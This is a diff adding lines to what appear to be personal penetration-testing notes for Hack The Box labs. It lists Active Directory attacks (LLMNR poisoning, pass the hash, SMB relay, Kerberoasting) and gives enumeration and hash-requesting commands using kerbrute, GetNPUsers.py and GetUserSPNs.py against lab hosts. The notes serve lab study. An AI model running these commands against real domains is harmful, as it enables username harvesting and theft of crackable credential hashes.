@@ -421,7 +421,26 @@ Windows Priv escalation:
 Always run winPEAS:
 
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+1- LLMNR/NBT-NS
+                 2- PASS THE HASH
+                 3- TOKENIZATION
+                 4- SMB RELAY ATTACK 
+                 5- KERBEROSTING:  
+                 
+                      1- Get a list of usernames: 
+                           enum4linux
+                           smbmap
 
+                           WITHOUT AUTH:
+                           kerbrute userenum -d htb.local dc htb.local wordlist.txt -t 100
+                           getnpusers.py  htb.local/  this will give list of usernames
+                           getnpusers.py  htb.local/ -dc-ip 10.10.10.10
+                           getnpusers.py  htb.local/ -dc-ip 10.10.10.10 -request           -give 
+                           
+                           WITH CREDENTIALS:
+                           getuserspn.py htb.local/sam:password
+                           getuserspn.py htb.local/sam:password  -request
 
 
 
